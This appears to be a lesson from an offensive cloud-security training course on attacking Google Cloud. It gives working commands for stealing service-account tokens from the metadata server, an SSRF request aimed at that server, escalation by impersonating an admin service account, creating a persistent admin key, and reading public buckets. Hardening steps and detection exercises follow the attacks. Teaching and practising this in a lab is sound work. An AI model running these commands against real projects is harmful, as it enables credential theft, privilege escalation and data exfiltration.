---
title: "Cloud Practice — GCP Attack Surface"
tags: [cloud-practice, GCP, service-account, metadata, GCS, IAM-binding,
       allUsers, privilege-escalation, workload-identity, gcloud, lab]
module: 04-BroadSurface-02
day: 202
related_topics:
  - GCP for Attackers (Day 190)
  - Azure for Attackers (Day 189)
  - Cloud Security Review (Day 196)
  - Cloud Practice Azure (Day 201)
---

# Day 202 — Cloud Practice: GCP

> "GCP IAM is bindings, not policies. That sounds like a minor implementation
> detail until you realise it means every escalation path is different from AWS.
> You don't create a policy version; you add an IAM binding. You don't PassRole;
> you grant serviceAccountTokenCreator. The pattern is the same — find a
> permission that lets you modify access — but the API surface is completely
> different. Learn both. The next target might be either."
>
> — Ghost

---

## Goals

By the end of today's practice session you will be able to:

1. Extract service account tokens via the GCP metadata server.
2. Enumerate GCP IAM bindings to identify privilege escalation paths.
3. Exploit `serviceAccountTokenCreator` to impersonate a higher-privilege SA.
4. Test GCS bucket IAM bindings for public access.
5. Use `gcloud` and direct API calls interchangeably.

---

## Prerequisites

| Requirement | Reference |
|---|---|
| GCP for Attackers | Day 190 |
| Cloud Full Attack Lab | Day 192 |
| Google Cloud SDK | `gcloud init` |
| GCP test project | Free trial or personal project |

---

## Setup

```bash
# Authenticate to GCP (use a test project — not production)
gcloud auth activate-service-account \
  --key-file=lab-service-account.json \
  --project=your-lab-project

PROJECT_ID=$(gcloud config get-value project)
echo "Working in: $PROJECT_ID"

# List active credentials
gcloud auth list

# Current identity
gcloud config get-value account
```

---

## Block 1 — GCP Metadata Server Exploitation (30 min)

### 1.1 — From Inside a GCE Instance

```bash
# The Metadata-Flavor: Google header is required (server rejects requests without it)
# Without it: curl returns 403 "Request had missing or invalid credentials"

# List all metadata
curl -s -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/" \
  | tr ',' '\n'

# Get the attached service account token
# (default SA is the primary SA attached to the instance)
TOKEN=$(curl -s -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])")

echo "SA token: ${TOKEN:0:50}..."

# Get the service account email (to know which SA's permissions you have)
SA_EMAIL=$(curl -s -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email")
echo "SA email: $SA_EMAIL"

# Check custom instance attributes (sometimes contain secrets)
curl -s -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/attributes/"
# → If there are custom attributes, enumerate each one:
curl -s -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/attributes/startup-script"
```

### 1.2 — SSRF to GCP Metadata

```python
# Test if an SSRF vulnerability reaches the GCP metadata server
import requests

SSRF_ENDPOINT = "https://app.target-project.appspot.com/fetch"

# The Metadata-Flavor header must be relayed by the SSRF endpoint
# This is the same challenge as Azure — header control is the blocker

r = requests.get(
    SSRF_ENDPOINT,
    params={
        "url": "http://metadata.google.internal/computeMetadata/v1/instance/"
               "service-accounts/default/token",
        "headers": '{"Metadata-Flavor": "Google"}'
    }
)
print("Status:", r.status_code)
print("Response:", r.text[:300])
```

### 1.3 — Using a Stolen Token

```bash
TOKEN="[stolen from Block 1.1]"

# Get caller identity
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://www.googleapis.com/oauth2/v1/tokeninfo" \
  | python3 -m json.tool

# List all GCS buckets in the project
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://storage.googleapis.com/storage/v1/b?project=$PROJECT_ID" \
  | python3 -c "
import sys, json
data = json.load(sys.stdin)
for b in data.get('items', []):
    print(b['name'])
"

# List IAM bindings at the project level
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://cloudresourcemanager.googleapis.com/v1/projects/$PROJECT_ID:getIamPolicy" \
  -X POST \
  | python3 -c "
import sys, json
policy = json.load(sys.stdin)
for binding in policy.get('bindings', []):
    print(binding['role'])
    for member in binding['members']:
        print('  -', member)
"
```

---

## Block 2 — IAM Enumeration and Escalation (45 min)

### 2.1 — Map the IAM Landscape

```bash
# List all service accounts in the project
gcloud iam service-accounts list --format="table(email, displayName, disabled)"

# For each service account, list IAM bindings (who can act as it)
for SA in $(gcloud iam service-accounts list --format="value(email)"); do
  echo "=== $SA ==="
  gcloud iam service-accounts get-iam-policy $SA \
    --format="table(bindings.role, bindings.members)" 2>/dev/null
done

# Project-level IAM bindings (the main access map)
gcloud projects get-iam-policy $PROJECT_ID \
  --format="table(bindings.role, bindings.members)"

# List custom IAM roles (may have unusual permissions)
gcloud iam roles list --project $PROJECT_ID \
  --format="table(name, title, stage)"

# Check your current permissions via IAM test (works with stored token)
gcloud projects test-iam-permissions $PROJECT_ID \
  iam.serviceAccounts.getAccessToken \
  iam.serviceAccounts.actAs \
  iam.serviceAccountKeys.create \
  resourcemanager.projects.setIamPolicy \
  storage.buckets.setIamPolicy \
  --format=json
```

### 2.2 — serviceAccountTokenCreator Escalation

```bash
# Check if your current SA has serviceAccountTokenCreator on a higher-priv SA
gcloud iam service-accounts get-iam-policy high-priv-sa@$PROJECT_ID.iam.gserviceaccount.com

# If you see roles/iam.serviceAccountTokenCreator with your SA as member:
# You can generate tokens for the high-priv SA

LOW_PRIV_TOKEN=$(curl -s -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])")

HIGH_PRIV_SA="admin-sa@${PROJECT_ID}.iam.gserviceaccount.com"

# Use the low-priv token to generate a token for the high-priv SA
HIGH_PRIV_TOKEN=$(curl -s \
  -H "Authorization: Bearer $LOW_PRIV_TOKEN" \
  -H "Content-Type: application/json" \
  -X POST \
  "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/${HIGH_PRIV_SA}:generateAccessToken" \
  -d '{"scope": ["https://www.googleapis.com/auth/cloud-platform"]}' \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['accessToken'])")

echo "High-priv token: ${HIGH_PRIV_TOKEN:0:50}..."

# Verify identity with the new token
curl -s -H "Authorization: Bearer $HIGH_PRIV_TOKEN" \
  "https://www.googleapis.com/oauth2/v1/tokeninfo" | python3 -m json.tool

# Now use admin SA token to enumerate everything
curl -s -H "Authorization: Bearer $HIGH_PRIV_TOKEN" \
  "https://cloudresourcemanager.googleapis.com/v1/projects/$PROJECT_ID:getIamPolicy" \
  -X POST | python3 -m json.tool
```

### 2.3 — serviceAccountKeyAdmin Escalation

```bash
# If you have iam.serviceAccountKeys.create on a high-priv SA:
# Create a JSON key file — long-lived, does not expire until explicitly deleted

HIGH_PRIV_SA="admin-sa@${PROJECT_ID}.iam.gserviceaccount.com"

gcloud iam service-accounts keys create \
  /tmp/stolen-key.json \
  --iam-account $HIGH_PRIV_SA

cat /tmp/stolen-key.json | python3 -m json.tool | head -5
echo "Key created — no expiry unless explicitly deleted"

# Authenticate with the stolen key
gcloud auth activate-service-account \
  --key-file=/tmp/stolen-key.json

# Confirm admin access
gcloud projects get-iam-policy $PROJECT_ID
gcloud storage ls
```

---

## Block 3 — GCS Bucket Attacks (30 min)

```bash
# List all buckets
gcloud storage ls
# or via API:
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://storage.googleapis.com/storage/v1/b?project=$PROJECT_ID" \
  | python3 -c "
import sys, json
for b in json.load(sys.stdin).get('items', []):
    print(b['name'])
"

# Check IAM policy on each bucket
for bucket in $(gcloud storage ls | sed 's|gs://||;s|/||'); do
  echo "=== $bucket ==="
  gcloud storage buckets get-iam-policy gs://$bucket 2>/dev/null \
    | grep -E 'role:|member:' | head -20
done

# The dangerous bindings:
# - allUsers: objectViewer → public read
# - allAuthenticatedUsers: objectViewer → any Google account can read
# - allUsers: objectAdmin → public read AND write

# Test anonymous access to a bucket (no authentication)
curl -s "https://storage.googleapis.com/storage/v1/b/[BUCKET_NAME]/o" \
  | python3 -c "
import sys, json
data = json.load(sys.stdin)
if 'error' in data:
    print('PRIVATE:', data['error']['message'])
else:
    print('PUBLIC — found', len(data.get('items', [])), 'objects')
    for obj in data.get('items', [])[:5]:
        print(' -', obj['name'], obj.get('size', '?'), 'bytes')
"

# Download a file from a public bucket
curl -o sensitive.pdf \
  "https://storage.googleapis.com/[BUCKET_NAME]/[OBJECT_NAME]"

# allAuthenticatedUsers — needs any Google account token
curl -H "Authorization: Bearer $PERSONAL_GOOGLE_TOKEN" \
  "https://storage.googleapis.com/storage/v1/b/[BUCKET_NAME]/o"
```

---

## Block 4 — Hardening Practice (20 min)

```bash
# Fix 1: Remove allUsers from all GCS buckets
for bucket in $(gcloud storage ls | sed 's|gs://||;s|/||'); do
  # Remove allUsers binding
  gsutil iam ch -d allUsers gs://$bucket 2>/dev/null && \
    echo "Removed allUsers from: $bucket"
  gsutil iam ch -d allAuthenticatedUsers gs://$bucket 2>/dev/null && \
    echo "Removed allAuthenticatedUsers from: $bucket"
done

# Fix 2: Enable uniform bucket-level access (prevents per-object ACLs)
for bucket in $(gcloud storage ls | sed 's|gs://||;s|/||'); do
  gcloud storage buckets update gs://$bucket \
    --uniform-bucket-level-access && \
    echo "Uniform access enabled: $bucket"
done

# Fix 3: Remove unused service account keys
for sa in $(gcloud iam service-accounts list --format="value(email)"); do
  keys=$(gcloud iam service-accounts keys list --iam-account $sa \
    --managed-by user --format="value(name)")
  for key in $keys; do
    created=$(gcloud iam service-accounts keys list \
      --iam-account $sa --format="value(validAfterTime)" | head -1)
    echo "Key $key for $sa created $created — review if needed"
  done
done

# Fix 4: Enable VPC Service Controls (prevents metadata exfiltration)
# → Requires VPC Service Controls perimeter — done via gcloud access-context-manager
gcloud access-context-manager perimeters list --policy=POLICY_ID
```

---

## Key Takeaways

1. **GCP metadata requires `Metadata-Flavor: Google` — same header-control challenge
   as Azure.** Simple SSRF without header relay cannot exploit it. The attacker
   needs a vector where they control request headers (e.g. SSRF through a service
   that forwards all headers, or RCE on the host).
2. **`serviceAccountTokenCreator` is a one-step IAM escalation.** If your SA has
   this role on any higher-privilege SA, you can generate tokens for that SA without
   needing the key file. Audit this binding in every GCP project assessment.
3. **GCS `allUsers` vs `allAuthenticatedUsers` is a meaningful distinction.** `allUsers`
   means anyone on the internet, including unauthenticated. `allAuthenticatedUsers`
   means any Google account — still public from an attacker standpoint because
   Google accounts are free and anonymous enough.
4. **SA JSON key files are long-lived credentials.** Unlike IMDS tokens (1-hour
   expiry), a downloaded JSON key file is valid until explicitly revoked. IR must
   include auditing and revoking all SA keys, not just rotating them.
5. **`iam.serviceAccountKeys.create` on a high-priv SA is effectively admin access.**
   The attacker creates a key for the admin SA and has long-lived admin credentials.
   Restrict key creation via Organisation Policy:
   `constraints/iam.disableServiceAccountKeyCreation`.

---

## Exercises

1. Write a Python script that enumerates all GCP service accounts in a project
   and outputs: (a) SAs with JSON keys, (b) SAs where other SAs have
   `serviceAccountTokenCreator` binding, (c) SAs with `iam.serviceAccountKeyAdmin`.
2. Set an Org Policy constraint that disables SA key creation for all projects in
   a test GCP organization. Verify that creating a key is denied.
3. Write a detection query (in Cloud Audit Logs / BigQuery) that finds:
   `GenerateAccessToken` calls where the calling SA email differs from the target
   SA email and the call happened outside business hours.
4. Compare the three cloud providers' metadata SSRF difficulty:
   AWS IMDSv1, AWS IMDSv2, Azure IMDS, GCP IMDS — rank them 1 (easiest to exploit
   via SSRF) to 4 (hardest). Justify each ranking.

---

## Questions

> Add your questions here. Each question gets a Global ID (Q202.1, Q202.2 …).
> Follow-up questions use hierarchical numbering (Q202.1.1, Q202.1.2 …).

---

## Navigation

← Previous: [Day 201 — Cloud Practice: Azure](DAY-0201-Cloud-Practice-Azure.md)
→ Next: [Day 203 — Cloud Practice: Persistence Detection](DAY-0203-Cloud-Practice-Persistence-Detection.md)
